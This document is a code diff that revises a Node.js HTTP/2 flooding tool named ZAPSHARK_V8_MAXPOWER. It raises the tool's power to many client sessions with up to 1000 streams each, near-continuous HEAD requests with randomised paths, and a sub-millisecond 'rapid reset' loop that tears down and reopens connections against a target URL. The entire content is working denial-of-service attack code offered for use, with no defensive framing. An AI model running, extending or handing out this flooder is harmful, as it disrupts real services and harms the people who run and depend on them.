@@ -1,236 +1,182 @@
 const http2 = require('http2');
-const os = require('os');
 
 class ZAPSHARK_V8_MAXPOWER {
     constructor(targetUrl) {
         this.targetUrl = targetUrl;
         this.hostname = new URL(targetUrl).hostname;
         this.totalRequests = 0;
+        this.requestsSinceLastCalc = 0;
+        this.lastDisplayUpdate = Date.now();
         
-        // CORE MANAGEMENT (Leave 2 cores free)
-        this.totalCores = os.cpus().length;
-        this.workerCount = Math.max(2, this.totalCores - 2);
+        // MAX POWER SETTINGS
+        this.clients = [];
+        this.clientCount = 10;
+        this.maxStreamsPerClient = 1000;
+        this.activeStreams = 0;
         
-        // CONNECTIONS PER WORKER
-        this.connsPerWorker = 8;
-        this.totalConnections = this.workerCount * this.connsPerWorker;
+        // EXTREME RAPID RESET
+        this.resetCounter = 0;
         
-        // WORKER POOL
-        this.workers = new Array(this.workerCount).fill(null).map(() => ({
-            connections: [],
-            lastCleanup: Date.now()
-        }));
+        // MEMORY LEAK FIX
+        this.requestMap = new Map();
+        this.lastCleanup = Date.now();
         
-        // MEMORY MANAGEMENT
-        this.gcInterval = 30000;
-        this.lastGC = Date.now();
-        this.requestChunks = 0;
-        
-        // ATTACK INTERVALS
+        // INTERVALS
         this.attackInterval = null;
-        this.maintenanceInterval = null;
+        this.resetIntervalObj = null;
+        this.displayInterval = null;
     }
 
-    // === WORKER CONNECTION MANAGEMENT ===
-    setupWorkerConnections(workerIndex) {
-        const worker = this.workers[workerIndex];
-        worker.connections = [];
-        
-        for (let i = 0; i < this.connsPerWorker; i++) {
+    // === MAX CONNECTIONS ===
+    initializeMaxConnections() {
+        for (let i = 0; i < this.clientCount; i++) {
             try {
-                const client = http2.connect(this.targetUrl, {
-                    maxSessionMemory: 8192,
-                    peerMaxConcurrentStreams: 100
-                });
-                
-                client.setMaxListeners(50);
+                const client = http2.connect(this.targetUrl);
+                client.setMaxListeners(1000);
                 client.on('error', () => {});
-                
-                worker.connections.push({
-                    client,
-                    requestCount: 0,
-                    created: Date.now()
-                });
-                
-            } catch (err) {
-                // SILENT
-            }
+                this.clients.push(client);
+            } catch (err) {}
         }
     }
 
-    initializeAllWorkers() {
-        for (let i = 0; i < this.workerCount; i++) {
-            setTimeout(() => {
-                this.setupWorkerConnections(i);
-            }, i * 50);
+    createClient() {
+        try {
+            const client = http2.connect(this.targetUrl);
+            client.setMaxListeners(1000);
+            client.on('error', () => {});
+            return client;
+        } catch (err) {
+            return null;
         }
     }
 
-    // === MEMORY SAFE REQUEST ===
-    sendRequests() {
-        this.requestChunks++;
+    // === EXTREME RAPID RESET ===
+    performExtremeReset() {
+        this.resetCounter++;
         
-        // FORCE CLEANUP EVERY 50K REQUESTS
-        if (this.requestChunks >= 50000) {
-            this.cleanupStaleConnections();
-            this.requestChunks = 0;
-        }
-        
-        // EACH WORKER SENDS REQUESTS
-        this.workers.forEach((worker, workerIndex) => {
-            if (worker.connections.length === 0) return;
+        if (this.clients.length > 0) {
+            const clientIndex = Math.floor(Math.random() * this.clients.length);
+            const client = this.clients[clientIndex];
             
-            // STREAMS PER WORKER
-            const streams = Math.min(20, worker.connections.length * 3);
-            
-            for (let i = 0; i < streams; i++) {
-                const conn = worker.connections[Math.floor(Math.random() * worker.connections.length)];
-                if (!conn) continue;
-
+            if (client) {
                 try {
-                    const req = conn.client.request({
-                        ':method': 'HEAD',
-                        ':path': '/'
-                    });
-                    
-                    conn.requestCount++;
-                    
-                    req.on('response', () => {
-                        try { req.destroy(); } catch (e) {}
-                    });
-                    
-                    req.on('error', () => {
-                        try { req.destroy(); } catch (e) {}
-                    });
-                    
-                    req.on('close', () => {
-                        this.totalRequests++;
-                    });
-                    
-                    req.end();
-                    
-                } catch (err) {
-                    this.totalRequests++;
-                }
-            }
-        });
-    }
-
-    // === MEMORY LEAK PREVENTION ===
-    cleanupStaleConnections() {
-        const now = Date.now();
-        
-        this.workers.forEach((worker, workerIndex) => {
-            // CLEANUP EVERY 30s PER WORKER
-            if (now - worker.lastCleanup >= 30000) {
-                worker.connections = worker.connections.filter(conn => {
-                    try {
-                        // DESTROY CONNECTIONS WITH 50K+ REQUESTS OR 5+ MIN OLD
-                        if (conn.requestCount >= 50000 || (now - conn.created) > 300000) {
-                            conn.client.destroy();
-                            return false;
-                        }
-                        return true;
-                    } catch (err) {
-                        return false;
+                    client.destroy();
+                    const newClient = this.createClient();
+                    if (newClient) {
+                        this.clients[clientIndex] = newClient;
                     }
-                });
-                
-                // REFILL IF NEEDED
-                while (worker.connections.length < this.connsPerWorker) {
-                    try {
-                        const client = http2.connect(this.targetUrl, {
-                            maxSessionMemory: 8192
-                        });
-                        client.setMaxListeners(50);
-                        client.on('error', () => {});
-                        
-                        worker.connections.push({
-                            client,
-                            requestCount: 0,
-                            created: Date.now()
-                        });
-                    } catch (err) {}
-                }
-                
-                worker.lastCleanup = now;
-            }
-        });
-        
-        // FORCE GARBAGE COLLECTION
-        if (global.gc && now - this.lastGC >= this.gcInterval) {
-            global.gc();
-            this.lastGC = now;
-        }
-    }
-
-    // === RAPID RESET (NO LOGGING) ===
-    performRapidReset() {
-        // RESET 1 WORKER AT A TIME (ROUND ROBIN)
-        const workerIndex = Math.floor(Math.random() * this.workers.length);
-        const worker = this.workers[workerIndex];
-        
-        if (worker && worker.connections.length > 0) {
-            const connIndex = Math.floor(Math.random() * worker.connections.length);
-            const conn = worker.connections[connIndex];
-            
-            if (conn) {
-                try {
-                    conn.client.destroy();
-                    
-                    const newClient = http2.connect(this.targetUrl, {
-                        maxSessionMemory: 8192
-                    });
-                    newClient.setMaxListeners(50);
-                    newClient.on('error', () => {});
-                    
-                    worker.connections[connIndex] = {
-                        client: newClient,
-                        requestCount: 0,
-                        created: Date.now()
-                    };
                 } catch (err) {}
             }
         }
     }
 
-    // === DISPLAY ONLY ===
+    // === MEMORY LEAK FIX ===
+    cleanupStaleRequests() {
+        const now = Date.now();
+        if (now - this.lastCleanup > 5000) { // Every 5 seconds
+            for (const [reqId, timestamp] of this.requestMap.entries()) {
+                if (now - timestamp > 10000) { // 10 seconds old
+                    this.requestMap.delete(reqId);
+                }
+            }
+            this.lastCleanup = now;
+        }
+    }
+
+    // === MAX POWER ATTACK WITH HEAD METHOD ===
+    sendMaxRequests() {
+        if (this.clients.length === 0) return;
+        
+        this.cleanupStaleRequests(); // MEMORY LEAK FIX
+        
+        const maxPossibleStreams = this.maxStreamsPerClient * this.clients.length;
+        const availableStreams = maxPossibleStreams - this.activeStreams;
+        const streamsThisTick = Math.max(1, Math.floor(availableStreams * 0.8));
+        
+        for (let i = 0; i < streamsThisTick; i++) {
+            const client = this.clients[Math.floor(Math.random() * this.clients.length)];
+            if (!client) continue;
+
+            try {
+                this.activeStreams++;
+                const reqId = Math.random().toString(36);
+                this.requestMap.set(reqId, Date.now()); // TRACK REQUEST
+                
+                const req = client.request({
+                    ':method': 'HEAD',
+                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5)
+                });
+                
+                // FIX: REMOVE EVENT LISTENERS PROPERLY
+                const cleanup = () => {
+                    this.activeStreams--;
+                    this.totalRequests++;
+                    this.requestsSinceLastCalc++;
+                    this.requestMap.delete(reqId); // CLEANUP TRACKING
+                    req.removeAllListeners(); // PREVENT MEMORY LEAK
+                };
+                
+                req.once('response', () => {
+                    req.destroy();
+                    cleanup();
+                });
+                
+                req.once('error', () => {
+                    req.destroy();
+                    cleanup();
+                });
+                
+                req.once('close', cleanup);
+                
+                req.end();
+                
+            } catch (err) {
+                this.activeStreams--;
+                this.totalRequests++;
+                this.requestsSinceLastCalc++;
+            }
+        }
+    }
+
+    // === ONLY LOGGING - OVERWRITING ===
     updateDisplay() {
         process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
     }
 
     // === MAIN - RUN FOREVER ===
     start() {
-        this.initializeAllWorkers();
+        this.initializeMaxConnections();
         
         setTimeout(() => {
-            // RAPID RESET LOOP
-            setInterval(() => {
-                this.performRapidReset();
-            }, 500); // 0.5ms
+            // EXTREME RAPID RESET
+            this.resetIntervalObj = setInterval(() => {
+                this.performExtremeReset();
+            }, 0.5);
             
-            // ATTACK LOOP
+            // MAX ATTACK LOOP
             this.attackInterval = setInterval(() => {
-                this.sendRequests();
+                for (let batch = 0; batch < 5; batch++) {
+                    this.sendMaxRequests();
+                }
                 this.updateDisplay();
             }, 0.1);
             
-            // MAINTENANCE LOOP
-            this.maintenanceInterval = setInterval(() => {
-                this.cleanupStaleConnections();
-            }, 10000);
+            // EXTRA MEMORY CLEANUP
+            setInterval(() => {
+                if (global.gc) global.gc();
+            }, 30000);
             
-        }, 3000);
+        }, 2000);
         
         process.on('SIGINT', () => {
             clearInterval(this.attackInterval);
-            clearInterval(this.maintenanceInterval);
+            clearInterval(this.resetIntervalObj);
             
-            this.workers.forEach(worker => {
-                worker.connections.forEach(conn => {
-                    try { conn.client.destroy(); } catch (e) {}
-                });
+            this.clients.forEach(client => {
+                try { client.destroy(); } catch (e) {}
             });
+            
+            this.requestMap.clear(); // CLEANUP
             
             process.exit(0);
         });
